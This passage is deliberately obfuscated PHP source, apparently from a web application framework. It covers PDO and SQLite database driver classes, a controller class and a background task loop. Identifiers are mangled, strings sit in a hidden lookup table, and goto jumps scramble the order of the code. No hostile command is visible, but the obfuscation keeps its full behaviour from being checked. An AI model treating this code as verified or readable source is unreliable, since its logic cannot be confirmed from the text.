(!$this->_linkID) { return !1; } if ($this->transTimes == 0) { $this->_linkID->beginTransaction(); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $°ëõ¬ş = $this->_linkID->commit(); $this->transTimes = 0; if (!$°ëõ¬ş) { $this->error(); return !1; } } return !0; } public function rollback() { if ($this->transTimes > 0) { $ÚÚˆş„ş = $this->_linkID->rollback(); $this->transTimes = 0; if (!$ÚÚˆş„ş) { $this->error(); return !1; } } return !0; } private function getAll() { $¦èæã‘è = $this->PDOStatement->fetchAll(PDO::FETCH_ASSOC); $this->numRows = count($¦èæã‘è); return $¦èæã‘è; } public function getFields($¹Íé…÷) { $’Çè® =& $_SERVER[–Ú¬çÁ]; $this->initConnect(!0); if (think_config($’Çè®[953])) { $Ÿ¢œÀ± = str_replace($’Çè®[954], $¹Íé…÷, think_config($’Çè®[953])); } else { switch ($this->dbType) { case $’Çè®[937]: case $’Çè®[955]: $Ÿ¢œÀ± = "\123\x45\x4c\105\103\124\40\x20\x20\143\157\154\165\155\156\x5f\156\x61\155\x65\x20\141\163\40\47\116\141\155\145\x27\54\40\40\x20\x64\141\164\141\x5f\x74\171\160\145\x20\x61\163\40\x27\124\171\x70\145\x27\x2c\x20\40\40\143\x6f\x6c\165\x6d\x6e\x5f\x64\x65\146\141\165\154\164\40\141\163\40\47\104\145\x66\x61\x75\x6c\164\x27\54\x20\x20\x20\x69\163\x5f\x6e\165\x6c\x6c\141\142\x6c\145\40\x61\x73\40\x27\116\165\x6c\154\x27\xa\11\11\106\122\117\115\11\151\156\x66\157\162\155\141\164\x69\x6f\156\x5f\x73\143\150\145\x6d\141\x2e\x74\141\x62\x6c\x65\x73\40\x41\x53\x20\164\xa\11\11\112\x4f\111\x4e\x9\x69\156\x66\157\162\x6d\141\164\x69\x6f\x6e\x5f\x73\x63\150\145\155\x61\x2e\x63\x6f\x6c\x75\x6d\x6e\x73\40\101\x53\40\x63\12\11\x9\117\x4e\x20\40\x74\56\164\141\x62\x6c\x65\137\143\x61\x74\141\x6c\x6f\x67\x20\x3d\x20\x63\x2e\x74\141\142\154\x65\x5f\x63\141\x74\x61\x6c\x6f\147\12\x9\11\101\116\x44\x20\x74\x2e\164\x61\x62\x6c\x65\x5f\163\x63\x68\145\155\x61\40\75\x20\143\x2e\164\141\142\154\145\x5f\x73\143\150\x65\x6d\141\xa\x9\x9\x41\x4e\x44\40\164\56\x74\x61\142\154\x65\137\x6e\x61\155\x65\x20\x3d\x20\143\x2e\164\x61\142\x6c\x65\137\x6e\x61\155\x65\12\x9\x9\127\x48\x45\122\105\x20\40\x20\x74\56\164\141\x62\154\x65\x5f\x6e\141\x6d\x65\x20\75\x20\x27{$¹Íé…÷}\47"; break; case $’Çè®[956]: $Ÿ¢œÀ± = $’Çè®[957] . $¹Íé…÷ . $’Çè®[958]; break; case $’Çè®[938]: case $’Çè®[940]: $Ÿ¢œÀ± = $’Çè®[959] . $’Çè®[960] . $’Çè®[961] . strtoupper($¹Íé…÷) . $’Çè®[962] . strtoupper($¹Íé…÷) . $’Çè®[963]; break; case $’Çè®[964]: $Ÿ¢œÀ± = $’Çè®[965] . $¹Íé…÷ . $’Çè®[966]; break; case $’Çè®[939]: break; case $’Çè®[967]: default: $Ÿ¢œÀ± = $’Çè®[968] . ($this->dbType == $’Çè®[967] ? "\140{$¹Íé…÷}\140" : $¹Íé…÷); } } $Õ˜›şİ™ = $this->query($Ÿ¢œÀ±); $ÈÛ¦³šş = array(); if ($Õ˜›şİ™) { foreach ($Õ˜›şİ™ as $—©Ó§Ÿ— => $ŒØ½š»œ) { $ŒØ½š»œ = array_change_key_case($ŒØ½š»œ); $ŒØ½š»œ[$’Çè®[32]] = isset($ŒØ½š»œ[$’Çè®[32]]) ? $ŒØ½š»œ[$’Çè®[32]] : $’Çè®[431]; $ŒØ½š»œ[$’Çè®[33]] = isset($ŒØ½š»œ[$’Çè®[33]]) ? $ŒØ½š»œ[$’Çè®[33]] : $’Çè®[431]; $ƒÚŒÛËİ = isset($ŒØ½š»œ[$’Çè®[326]]) ? $ŒØ½š»œ[$’Çè®[326]] : $ŒØ½š»œ[$’Çè®[32]]; $ÈÛ¦³šş[$ƒÚŒÛËİ] = array($’Çè®[32] => $ƒÚŒÛËİ, $’Çè®[33] => $ŒØ½š»œ[$’Çè®[33]], $’Çè®[35] => (bool) (isset($ŒØ½š»œ[$’Çè®[103]]) && $ŒØ½š»œ[$’Çè®[103]] === $’Çè®[12] || isset($ŒØ½š»œ[$’Çè®[35]]) && $ŒØ½š»œ[$’Çè®[35]] === $’Çè®[12]), $’Çè®[37] => isset($ŒØ½š»œ[$’Çè®[37]]) ? $ŒØ½š»œ[$’Çè®[37]] : (isset($ŒØ½š»œ[$’Çè®[56]]) ? $ŒØ½š»œ[$’Çè®[56]] : $’Çè®[431]), $’Çè®[39] => isset($ŒØ½š»œ[$’Çè®[94]]) ? strtolower($ŒØ½š»œ[$’Çè®[94]]) == $’Çè®[41] : (isset($ŒØ½š»œ[$’Çè®[57]]) ? $ŒØ½š»œ[$’Çè®[57]] : !1), $’Çè®[42] => isset($ŒØ½š»œ[$’Çè®[969]]) ? strtolower($ŒØ½š»œ[$’Çè®[969]]) == $’Çè®[44] : (isset($ŒØ½š»œ[$’Çè®[94]]) ? $ŒØ½š»œ[$’Çè®[94]] : !1)); } } return $ÈÛ¦³šş; } public function getTables($ò½Ğä = '') { $ãÓÌ…˜Ã =& $_SERVER[–Ú¬çÁ]; if (think_config($ãÓÌ…˜Ã[970])) { $ğä×›ÍÉ = str_replace($ãÓÌ…˜Ã[971], $ò½Ğä, think_config($ãÓÌ…˜Ã[970])); } else { switch ($this->dbType) { case $ãÓÌ…˜Ã[938]: case $ãÓÌ…˜Ã[940]: $ğä×›ÍÉ = $ãÓÌ…˜Ã[972]; break; case $ãÓÌ…˜Ã[937]: case $ãÓÌ…˜Ã[955]: $ğä×›ÍÉ = $ãÓÌ…˜Ã[973]; break; case $ãÓÌ…˜Ã[964]: $ğä×›ÍÉ = $ãÓÌ…˜Ã[974]; break; case $ãÓÌ…˜Ã[939]: think_exception(think_lang($ãÓÌ…˜Ã[975]) . $ãÓÌ…˜Ã[976]); break; case $ãÓÌ…˜Ã[956]: $ğä×›ÍÉ = $ãÓÌ…˜Ã[45] . $ãÓÌ…˜Ã[46] . $ãÓÌ…˜Ã[47]; break; case $ãÓÌ…˜Ã[967]: default: if (!empty($ò½Ğä)) { $ğä×›ÍÉ = $ãÓÌ…˜Ã[919] . $ò½Ğä . $ãÓÌ…˜Ã[920]; } else { $ğä×›ÍÉ = $ãÓÌ…˜Ã[921]; } } } $Íú­ÜîÃ = $this->query($ğä×›ÍÉ); $±ÛÉó²ò = array(); foreach ($Íú­ÜîÃ as $¶õõğºÎ => $æ¢×ñ¶©) { $±ÛÉó²ò[$¶õõğºÎ] = current($æ¢×ñ¶©); } return $±ÛÉó²ò; } protected function parseLimit($æ±¥Ş¡¾) { $ŸÈşØ =& $_SERVER[–Ú¬çÁ]; $—µ¥ÃËÕ = $ŸÈşØ[12]; if (!empty($æ±¥Ş¡¾)) { switch ($this->dbType) { case $ŸÈşØ[964]: case $ŸÈşØ[956]: $æ±¥Ş¡¾ = explode($ŸÈşØ[50], $æ±¥Ş¡¾); if (count($æ±¥Ş¡¾) > 1) { $—µ¥ÃËÕ .= $ŸÈşØ[51] . $æ±¥Ş¡¾[1] . $ŸÈşØ[52] . $æ±¥Ş¡¾[0] . $ŸÈşØ[53]; } else { $—µ¥ÃËÕ .= $ŸÈşØ[51] . $æ±¥Ş¡¾[0] . $ŸÈşØ[53]; } break; case $ŸÈşØ[937]: case $ŸÈşØ[955]: break; case $ŸÈşØ[939]: break; case $ŸÈşØ[938]: case $ŸÈşØ[940]: break; case $ŸÈşØ[967]: default: $—µ¥ÃËÕ .= $ŸÈşØ[51] . $æ±¥Ş¡¾ . $ŸÈşØ[53]; } } return $—µ¥ÃËÕ; } public function parseKey(&$Úã•ÌÕó, $Œß­å¿ƒ = true) { $Öì§úÌ =& $_SERVER[–Ú¬çÁ]; if ($Œß­å¿ƒ) { $Úã•ÌÕó = $this->parseKeyCheck($Úã•ÌÕó); } if ($this->dbType == $Öì§úÌ[967]) { if ($Úã•ÌÕó != $Öì§úÌ[213] && !preg_match($Öì§úÌ[931], $Úã•ÌÕó)) { $Úã•ÌÕó = $Öì§úÌ[438] . trim($Úã•ÌÕó, $Öì§úÌ[438]) . $Öì§úÌ[438]; } return $Úã•ÌÕó; } else { return parent::parseKey($Úã•ÌÕó, $Œß­å¿ƒ); } } public function close() { $this->_linkID = null; } public function error() { $ŸØ¤ú² =& $_SERVER[–Ú¬çÁ]; if ($this->PDOStatement) { $™œŒšáï = $this->PDOStatement->errorInfo(); $this->error = $™œŒšáï[1] . $ŸØ¤ú²[4] . $™œŒšáï[2]; } else { $this->error = $ŸØ¤ú²[12]; } if ($ŸØ¤ú²[12] != $this->queryStr) { $this->error .= LNG($ŸØ¤ú²[48]) . $this->queryStr; } think_trace($this->error, $ŸØ¤ú²[12], $ŸØ¤ú²[49]); return $this->error; } public function escapeString($ÈºöîÁ) { $É¡§×Š¦ =& $_SERVER[–Ú¬çÁ]; switch ($this->dbType) { case $É¡§×Š¦[964]: case $É¡§×Š¦[937]: case $É¡§×Š¦[955]: case $É¡§×Š¦[967]: return addslashes($ÈºöîÁ); case $É¡§×Š¦[939]: case $É¡§×Š¦[956]: case $É¡§×Š¦[938]: case $É¡§×Š¦[940]: return str_ireplace($É¡§×Š¦[58], $É¡§×Š¦[59], $ÈºöîÁ); } } protected function parseValue($§Ô‡Û ) { $§äù«Š€ =& $_SERVER[–Ú¬çÁ]; if (is_string($§Ô‡Û )) { $òş Ğ§ = strpos($§Ô‡Û , $§äù«Š€[4]) === 0 && in_array($§Ô‡Û , array_keys($this->bind)); $§Ô‡Û  = $òş Ğ§ ? $this->escapeString($§Ô‡Û ) : $§äù«Š€[977] . $this->escapeString($§Ô‡Û ) . $§äù«Š€[977]; } elseif (isset($§Ô‡Û [0]) && is_string($§Ô‡Û [0]) && strtolower($§Ô‡Û [0]) == $§äù«Š€[350]) { $§Ô‡Û  = $this->escapeString($§Ô‡Û [1]); } elseif (is_array($§Ô‡Û )) { $§Ô‡Û  = array_map(array($this, $§äù«Š€[978]), $§Ô‡Û ); } elseif (is_bool($§Ô‡Û )) { $§Ô‡Û  = $§Ô‡Û  ? $§äù«Š€[88] : $§äù«Š€[222]; } elseif (is_null($§Ô‡Û )) { $§Ô‡Û  = $§äù«Š€[103]; } return $§Ô‡Û ; } public function getLastInsertId() { $¼ˆ¸òÅ¶ =& $_SERVER[–Ú¬çÁ]; switch ($this->dbType) { case $¼ˆ¸òÅ¶[964]: case $¼ˆ¸òÅ¶[956]: case $¼ˆ¸òÅ¶[937]: case $¼ˆ¸òÅ¶[955]: case $¼ˆ¸òÅ¶[939]: case $¼ˆ¸òÅ¶[967]: return $this->_linkID->lastInsertId(); case $¼ˆ¸òÅ¶[938]: case $¼ˆ¸òÅ¶[940]: $Ä¢ Úşø = $this->table; $œšÎ¾£° = $this->query("\x53\105\x4c\105\x43\x54\40{$Ä¢ Úşø}\56\x63\165\162\x72\166\141\x6c\x20\x63\x75\162\x72\166\141\x6c\40\x46\122\117\x4d\x20\144\165\x61\x6c"); return $œšÎ¾£° ? $œšÎ¾£°[0][$¼ˆ¸òÅ¶[979]] : 0; } } } goto E…ìÀø×ºÛ; B“­ƒøïÉ: class Controller extends ClassBaseCall { public $in; public $config; public $tpl; public $values; function __construct() { $ÑÊÆØ³ =& $_SERVER[–Ú¬çÁ]; global $in, $config; $this->config =& $config; $this->in =& $in; $this->values[$ÑÊÆØ³[6]] =& $config; $this->values[$ÑÊÆØ³[7]] =& $in; $this->tpl = TEMPLATE . MOD . $ÑÊÆØ³[8]; $this->_classObjectID = mt_rand(0, 10000); } public function loadClass($¤½ÑğÌ‹) { if (1 === func_num_args()) { $this->{$¤½ÑğÌ‹} = new $¤½ÑğÌ‹(); } else { $´áí¬‰ş = new ReflectionClass($¤½ÑğÌ‹); $äåÔÅµ = func_get_args(); array_shift($äåÔÅµ); $this->{$¤½ÑğÌ‹} = $´áí¬‰ş->newInstanceArgs($äåÔÅµ); } return $this->{$¤½ÑğÌ‹}; } public function routeBind($ùš»£íš, $´ó·ı´¿, $‡–áÆ± = 3) { $àÕ¼»«Ç =& $_SERVER[–Ú¬çÁ]; $úü×ãİ© = $this->in[$àÕ¼»«Ç[9]]; $ùš»£íš = str_replace($àÕ¼»«Ç[10], $àÕ¼»«Ç[11], trim(trim($ùš»£íš, $àÕ¼»«Ç[8]), $àÕ¼»«Ç[12])); if (!$ùš»£íš || count($úü×ãİ©) <= $‡–áÆ±) { return !1; } $¦•ŸŞêú = !0; $òÓ­ˆÅÎ = explode($àÕ¼»«Ç[8], $ùš»£íš); for ($ÏÖõïç = 0; $ÏÖõïç < count($òÓ­ˆÅÎ); $ÏÖõïç++) { if ($òÓ­ˆÅÎ[$ÏÖõïç] != $úü×ãİ©[$‡–áÆ± + $ÏÖõïç]) { $¦•ŸŞêú = !1; break; } } if (!$¦•ŸŞêú) { return; } call_user_func_array(array($this, $´ó·ı´¿), array()); } public function routeArgs($˜´—¢»³ = 3) { $š˜Í¹ƒ¢ = $this->in[$_SERVER[–Ú¬çÁ][9]]; if (count($š˜Í¹ƒ¢) <= $˜´—¢»³) { return array(); } $«±¢Çû = array(); for ($ŠöçĞÈ = $˜´—¢»³; $ŠöçĞÈ < count($š˜Í¹ƒ¢); $ŠöçĞÈ += 2) { $«±¢Çû[$š˜Í¹ƒ¢[$ŠöçĞÈ]] = $š˜Í¹ƒ¢[$ŠöçĞÈ + 1]; $this->in[$š˜Í¹ƒ¢[$ŠöçĞÈ]] = $š˜Í¹ƒ¢[$ŠöçĞÈ + 1]; } return $«±¢Çû; } protected function assign($±Šìş¢, $ †ÔªŞ) { $this->values[$±Šìş¢] = $ †ÔªŞ; } protected function display($Äç›åÛ) { ob_end_clean(); extract($this->values); require $this->tpl . $Äç›åÛ; } } class DbSqliteBase extends Db { public function __construct($ÂÅ‹Û®» = '') { $œ”’ŠÏ =& $_SERVER[–Ú¬çÁ]; if (!extension_loaded($œ”’ŠÏ[13])) { think_exception(think_lang($œ”’ŠÏ[14]) . $œ”’ŠÏ[15]); } if (!empty($ÂÅ‹Û®»)) { if (!isset($ÂÅ‹Û®»[$œ”’ŠÏ[16]])) { $ÂÅ‹Û®»[$œ”’ŠÏ[16]] = 438; } $this->config = $ÂÅ‹Û®»; if (empty($this->config[$œ”’ŠÏ[17]])) { $this->config[$œ”’ŠÏ[17]] = array(); } } } public function connect($ÁÁªØëÆ = '', $§›ñÁÆá = 0) { $à­äÄõÒ =& $_SERVER[–Ú¬çÁ]; if (!isset($this->linkID[$§›ñÁÆá])) { if (empty($ÁÁªØëÆ)) { $ÁÁªØëÆ = $this->config; } $“áƒ­ÊÛ = !empty($ÁÁªØëÆ[$à­äÄõÒ[17]][$à­äÄõÒ[18]]) ? $ÁÁªØëÆ[$à­äÄõÒ[17]][$à­äÄõÒ[18]] : $this->pconnect; $ã˜ßìç‚ = $“áƒ­ÊÛ ? $à­äÄõÒ[19] : $à­äÄõÒ[20]; $this->linkID[$§›ñÁÆá] = $ã˜ßìç‚($ÁÁªØëÆ[$à­äÄõÒ[21]], $ÁÁªØëÆ[$à­äÄõÒ[16]]); if (!$this->linkID[$§›ñÁÆá]) { think_exception(sqlite_error_string()); } $this->connected = !0; @sqlite_busy_timeout($this->linkID[$§›ñÁÆá], 30000); if (1 != think_config($à­äÄõÒ[22])) { unset($this->config); } } return $this->linkID[$§›ñÁÆá]; } public function free() { $this->queryID = null; } public function query($šèÔöÊ©) { $õ–œ¶®Ş =& $_SERVER[–Ú¬çÁ]; $this->initConnect(!1); if (!$this->_linkID) { return !1; } $this->queryStr = $šèÔöÊ©; if ($this->queryID) { $this->free(); } think_action_status($õ–œ¶®Ş[23], 1); think_status($õ–œ¶®Ş[24]); $this->queryID = sqlite_query($this->_linkID, $šèÔöÊ©); $this->debug(); if (!1 === $this->queryID) { $this->error(); return !1; } else { $this->numRows = sqlite_num_rows($this->queryID); $·Â§‘ùÉ = $this->getAll(); return $·Â§‘ùÉ; } } public function execute($Åš™±¹) { $ñäñš¤ =& $_SERVER[–Ú¬çÁ]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } $this->queryStr = $Åš™±¹; if ($this->queryID) { $this->free(); } think_action_status($ñäñš¤[25], 1); think_status($ñäñš¤[24]); $Ğ½‚¥ = sqlite_exec($this->_linkID, $Åš™±¹); $this->debug(); if (!1 === $Ğ½‚¥) { $this->error(); return !1; } else { $this->numRows = sqlite_changes($this->_linkID); $this->lastInsID = sqlite_last_insert_rowid($this->_linkID); return $this->numRows; } } public function startTrans() { $this->initConnect(!0); if (!$this->_linkID) { return !1; } if ($this->transTimes == 0) { sqlite_query($this->_linkID, $_SERVER[–Ú¬çÁ][26]); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $Ÿ‰ÃÁÕ‡ = sqlite_query($this->_linkID, $_SERVER[–Ú¬çÁ][27]); if (!$Ÿ‰ÃÁÕ‡) { $this->error(); return !1; } $this->transTimes = 0; } return !0; } public function rollback() { if ($this->transTimes > 0) { $åÖßšò = sqlite_query($this->_linkID, $_SERVER[–Ú¬çÁ][28]); if (!$åÖßšò) { $this->error(); return !1; } $this->transTimes = 0; } return !0; } private function getAll() { $¦¿ßÌóˆ = array(); if ($this->numRows > 0) { for ($±ÓÅÊâ = 0; $±ÓÅÊâ < $this->numRows; $±ÓÅÊâ++) { $¦¿ßÌóˆ[$±ÓÅÊâ] = sqlite_fetch_array($this->queryID, SQLITE_ASSOC); } sqlite_seek($this->queryID, 0); } return $¦¿ßÌóˆ; } public function getFields($øÔ™§€ç) { $äº¸û§ =& $_SERVER[–Ú¬çÁ]; $Ş˜£²Ÿƒ = $this->query($äº¸û§[29] . $øÔ™§€ç . $äº¸û§[30]); $äééÓÇÓ = array(); if ($Ş˜£²Ÿƒ) { foreach ($Ş˜£²Ÿƒ as $ª‚ï­²Ë => $€¶§Ó¿Õ) { $äééÓÇÓ[$€¶§Ó¿Õ[$äº¸û§[31]]] = array($äº¸û§[32] => $€¶§Ó¿Õ[$äº¸û§[31]], $äº¸û§[33] => $€¶§Ó¿Õ[$äº¸û§[34]], $äº¸û§[35] => (bool) ($€¶§Ó¿Õ[$äº¸û§[36]] === $äº¸û§[12]), $äº¸û§[37] => $€¶§Ó¿Õ[$äº¸û§[38]], $äº¸û§[39] => strtolower($€¶§Ó¿Õ[$äº¸û§[40]]) == $äº¸û§[41], $äº¸û§[42] => strtolower($€¶§Ó¿Õ[$äº¸û§[43]]) == $äº¸û§[44]); } } return $äééÓÇÓ; } public function getTables($¥öš±ƒ = '') { $¿‘úÇŒô =& $_SERVER[–Ú¬çÁ]; $ò¾ßê§ = $this->query($¿‘úÇŒô[45] . $¿‘úÇŒô[46] . $¿‘úÇŒô[47]); $¸Ñ»Äí‰ = array(); foreach ($ò¾ßê§ as $âŠø†”Ö => $äË˜©Æ‘) { $¸Ñ»Äí‰[$âŠø†”Ö] = current($äË˜©Æ‘); } return $¸Ñ»Äí‰; } public function close() { if ($this->_linkID) { sqlite_close($this->_linkID); } $this->_linkID = null; } public function error() { $şâ§•áÛ =& $_SERVER[–Ú¬çÁ]; $ĞÀ€¦üü = sqlite_last_error($this->_linkID); $this->error = $ĞÀ€¦üü . $şâ§•áÛ[4] . sqlite_error_string($ĞÀ€¦üü); if ($şâ§•áÛ[12] != $this->queryStr) { $this->error .= LNG($şâ§•áÛ[48]) . $this->queryStr; } think_trace($this->error, $şâ§•áÛ[12], $şâ§•áÛ[49]); return $this->error; } public function escapeString($®Ç³’İ¡) { return sqlite_escape_string($®Ç³’İ¡); } public function parseLimit($Â‘„éÅ¤) { $×ÀçÖä‚ =& $_SERVER[–Ú¬çÁ]; $üÄ ßÜ = $×ÀçÖä‚[12]; if (!empty($Â‘„éÅ¤)) { $Â‘„éÅ¤ = explode($×ÀçÖä‚[50], $Â‘„éÅ¤); if (count($Â‘„éÅ¤) > 1) { $üÄ ßÜ .= $×ÀçÖä‚[51] . $Â‘„éÅ¤[1] . $×ÀçÖä‚[52] . $Â‘„éÅ¤[0] . $×ÀçÖä‚[53]; } else { $üÄ ßÜ .= $×ÀçÖä‚[51] . $Â‘„éÅ¤[0] . $×ÀçÖä‚[53]; } } return $üÄ ßÜ; } } class DbSqlite3Base extends Db { public function __construct($ñº¿é½¦ = '') { $µş²á¥µ =& $_SERVER[–Ú¬çÁ]; if (!class_exists($µş²á¥µ[54])) { think_exception(think_lang($µş²á¥µ[14]) . $µş²á¥µ[55]); } if (!empty($ñº¿é½¦)) { if (!isset($ñº¿é½¦[$µş²á¥µ[16]])) { $ñº¿é½¦[$µş²á¥µ[16]] = 438; } $this->config = $ñº¿é½¦; if (empty($this->config[$µş²á¥µ[17]])) { $this->config[$µş²á¥µ[17]] = array(); } } } public function connect($¬²¯‡ÄÍ = '', $Ôé½É¨“ = 0) { $¯¡û’ƒ­ =& $_SERVER[–Ú¬çÁ]; if (!isset($this->linkID[$Ôé½É¨“])) { if (empty($¬²¯‡ÄÍ)) { $¬²¯‡ÄÍ = $this->config; } $this->linkID[$Ôé½É¨“] = new SQLite3($¬²¯‡ÄÍ[$¯¡û’ƒ­[21]]); if (!$this->linkID[$Ôé½É¨“]) { think_exception($this->linkID[$Ôé½É¨“]->lastErrorMsg()); } $this->connected = !0; @$this->linkID[$Ôé½É¨“]->busyTimeout(30000); if (1 != think_config($¯¡û’ƒ­[22])) { unset($this->config); } } return $this->linkID[$Ôé½É¨“]; } public function free() { $this->queryID = null; } public function query($Ç×¹øò) { $¹Æ–ÕÄ¥ =& $_SERVER[–Ú¬çÁ]; $this->initConnect(!1); if (!$this->_linkID) { return !1; } $this->queryStr = $Ç×¹øò; if ($this->queryID) { $this->free(); } think_action_status($¹Æ–ÕÄ¥[23], 1); think_status($¹Æ–ÕÄ¥[24]); $this->queryID = $this->_linkID->query($Ç×¹øò); $this->debug(); if (!1 === $this->queryID) { $this->error(); return !1; } else { $ÆøáÍ = $this->getAll(); $this->numRows = count($ÆøáÍ); return $ÆøáÍ; } } public function execute($¿ôÙ½È­) { $¾±Ğ¸ =& $_SERVER[–Ú¬çÁ]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } $this->queryStr = $¿ôÙ½È­; if ($this->queryID) { $this->free(); } think_action_status($¾±Ğ¸[25], 1); think_status($¾±Ğ¸[24]); $¢ÉÑĞ˜‰ = $this->_linkID->exec($¿ôÙ½È­); $this->debug(); if (!1 === $¢ÉÑĞ˜‰) { $this->error(); return !1; } else { $this->numRows = $this->_linkID->changes(); $this->lastInsID = $this->_linkID->lastInsertRowID(); return $this->numRows; } } public function startTrans() { $this->initConnect(!0); if (!$this->_linkID) { return !1; } if ($this->transTimes == 0) { $this->_linkID->query($_SERVER[–Ú¬çÁ][26]); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $Æ˜ú„ÔŸ = $this->_linkID->query($_SERVER[–Ú¬çÁ][27]); if (!$Æ˜ú„ÔŸ) { $this->error(); return !1; } $this->transTimes = 0; } return !0; } public function rollback() { if ($this->transTimes > 0) { $Êê²‹îÌ = $this->_linkID->query($_SERVER[–Ú¬çÁ][28]); if (!$Êê²‹îÌ) { $this->error(); return !1; } $this->transTimes = 0; } return !0; } private function getAll() { $ÊÒÏÜÓÏ = array(); while ($¿ï©Ê¨Ë = $this->queryID->fetchArray(SQLITE3_ASSOC)) { $ÊÒÏÜÓÏ[] = $¿ï©Ê¨Ë; } $this->queryID->reset(); return $ÊÒÏÜÓÏ; } public function getFields($Ô†Üœ—Ø) { $¯•›ŸÑ· =& $_SERVER[–Ú¬çÁ]; $ô˜Ï®’ = $this->query($¯•›ŸÑ·[29] . $Ô†Üœ—Ø . $¯•›ŸÑ·[30]); $Î­àôªñ = array(); if ($ô˜Ï®’) { foreach ($ô˜Ï®’ as $£íáµ¯‚ => $Í‡¦ßÎĞ) { $Î­àôªñ[$Í‡¦ßÎĞ[$¯•›ŸÑ·[32]]] = array($¯•›ŸÑ·[32] => $Í‡¦ßÎĞ[$¯•›ŸÑ·[32]], $¯•›ŸÑ·[33] => $Í‡¦ßÎĞ[$¯•›ŸÑ·[33]], $¯•›ŸÑ·[35] => (bool) ($Í‡¦ßÎĞ[$¯•›ŸÑ·[35]] === $¯•›ŸÑ·[12]), $¯•›ŸÑ·[37] => $Í‡¦ßÎĞ[$¯•›ŸÑ·[56]], $¯•›ŸÑ·[39] => (bool) $Í‡¦ßÎĞ[$¯•›ŸÑ·[57]], $¯•›ŸÑ·[42] => (bool) $Í‡¦ßÎĞ[$¯•›ŸÑ·[57]]); } } return $Î­àôªñ; } public function getTables($õ¥ƒñÃ› = '') { $££Ä·©È =& $_SERVER[–Ú¬çÁ]; $Š‹®º¶ƒ = $this->query($££Ä·©È[45] . $££Ä·©È[46] . $££Ä·©È[47]); $Ì¼áÖÊÎ = array(); foreach ($Š‹®º¶ƒ as $­·ĞŞÚ => $ßŒÈ•ó) { $Ì¼áÖÊÎ[$­·ĞŞÚ] = current($ßŒÈ•ó); } return $Ì¼áÖÊÎ; } public function close() { if ($this->_linkID) { $this->_linkID->close(); } $this->_linkID = null; } public function error() { $è­ô°›‰ =& $_SERVER[–Ú¬çÁ]; $this->error = $this->_linkID->lastErrorMsg(); if ($è­ô°›‰[12] != $this->queryStr) { $this->error .= LNG($è­ô°›‰[48]) . $this->queryStr; } think_trace($this->error, $è­ô°›‰[12], $è­ô°›‰[49]); return $this->error; } public function escapeString($¡£©½Ğ) { $£©ÖĞúñ =& $_SERVER[–Ú¬çÁ]; if ($this->_linkID) { return $this->_linkID->escapeString($¡£©½Ğ); } return str_ireplace($£©ÖĞúñ[58], $£©ÖĞúñ[59], $¡£©½Ğ); } public function parseLimit($ÈÜŠÅ±ö) { $İø˜’äÈ =& $_SERVER[–Ú¬çÁ]; $·ãÈç = $İø˜’äÈ[12]; if (!empty($ÈÜŠÅ±ö)) { $ÈÜŠÅ±ö = explode($İø˜’äÈ[50], $ÈÜŠÅ±ö); if (count($ÈÜŠÅ±ö) > 1) { $·ãÈç .= $İø˜’äÈ[51] . $ÈÜŠÅ±ö[1] . $İø˜’äÈ[52] . $ÈÜŠÅ±ö[0] . $İø˜’äÈ[53]; } else { $·ãÈç .= $İø˜’äÈ[51] . $ÈÜŠÅ±ö[0] . $İø˜’äÈ[53]; } } return $·ãÈç; } } goto bÊÔæÄÊ†; EŸ±ê¸¼‰Ü: class AutoTask { const AUTO_DELAY_TIME = 2; const AUTO_RESTART_TIME = 7200; public static function start() { $Òı Ó…Â =& $_SERVER[–Ú¬çÁ]; if (self::valueGet($Òı Ó…Â[770]) != $Òı Ó…Â[88]) { return; } if (self::valueGet($Òı Ó…Â[1622]) == $Òı Ó…Â[88]) { $âºÂŸµÊ = self::valueGet($Òı Ó…Â[1623]); if (time() - $âºÂŸµÊ > self::AUTO_RESTART_TIME) { self::restart(); } return; } self::clearUserStatus(); self::valueSet($Òı Ó…Â[1622], $Òı Ó…Â[88]); self::log($Òı Ó…Â[1624] . ACTION . $Òı Ó…Â[1625]); Hook::bind($Òı Ó…Â[1626], $Òı Ó…Â[1627]); $¡í£Ÿ¾ç = 0; while (!0) { self::cacheClear(); if (self::valueGet($Òı Ó…Â[770]) != $Òı Ó…Â[88]) { self::valueSet($Òı Ó…Â[1622], $Òı Ó…Â[222]); self::log($Òı Ó…Â[1628]); die; } $„â·¢³Š = time(); if ($„â·¢³Š - $¡í£Ÿ¾ç >= 60) { self::valueSet(array($Òı Ó…Â[1622] => $Òı Ó…Â[88], $Òı Ó…Â[1623] => $„â·¢³Š), !1); $¡í£Ÿ¾ç = $„â·¢³Š; } if (!file_exists(USER_SYSTEM . $Òı Ó…Â[1629])) { self::valueSet(array($Òı Ó…Â[1622] => $Òı Ó…Â[222], $Òı Ó…Â[770] => $Òı Ó…Â[222]), !1); die; } self::taskRunAll(); sleep(self::AUTO_DELAY_TIME); } } public static function clearUserStatus() { $š› àşş =& $_SERVER[–Ú¬çÁ]; http_close(); $GLOBALS[$š› àşş[1630]] = 1; $_SERVER[$š› àşş[1631]] = $š› àşş[1632]; $_COOKIE = array(); $GLOBALS[$š› àşş[546]] = 1; $GLOBALS[$š› àşş[1633]] = 1; Session::$sessionSign = guid(); Session::$data = array(); } public static function restart() { $—ìµ×³Ú =& $_SERVER[–Ú¬çÁ]; http_close(); self::valueSet($—ìµ×³Ú[770], $—ìµ×³Ú[222]); sleep(self::AUTO_DELAY_TIME + 5); self::valueSet(array($—ìµ×³Ú[1622] => $—ìµ×³Ú[222], $—ìµ×³Ú[770] => $—ìµ×³Ú[88]), !1); } public static function taskSwitch() { $ñÂú‹Éâ =& $_SERVER[–Ú¬çÁ]; $Á’Ä¹ìÂ = self::valueGet($ñÂú‹Éâ[770]) == $ñÂú‹Éâ[88] ? $ñÂú‹Éâ[222] : $ñÂú‹Éâ[88]; self::valueSet($ñÂú‹Éâ[770], $Á’Ä¹ìÂ); } public static function shutdownEvent() { $ÂõãŸ”Ÿ =& $_SERVER[–Ú¬çÁ]; self::valueSet($ÂõãŸ”Ÿ[1622], $ÂõãŸ”Ÿ[222]); self::log($ÂõãŸ”Ÿ[1634]); } public static function config($óóÜáËŞ, $¡˜ï°ª°) { self::valueSet($_SERVER[–Ú¬çÁ][770], $óóÜáËŞ); } private static function taskRunAll() { $Ò•ÎÀ½’ =& $_SERVER[–Ú¬çÁ]; $îêÆ•Â™ = timeFloat(); $‰È”ô¥ = 